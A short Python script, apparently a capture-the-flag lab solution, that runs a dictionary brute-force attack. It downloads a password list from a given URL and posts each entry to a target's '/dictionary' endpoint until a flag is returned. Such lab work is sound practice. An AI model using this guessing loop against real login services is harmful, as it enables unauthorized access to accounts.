import requests

ip = input("Enter the target IP: ").strip()  # Change this to your instance IP address
port = input("Enter the target PORT: ").strip()       # Change this to your instance port number
url = input("Enter the source URL for passwords(Example => http://test1.com/): ").strip()

# Download a list of common passwords from the url
passwords = requests.get(url).text.splitlines() 

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
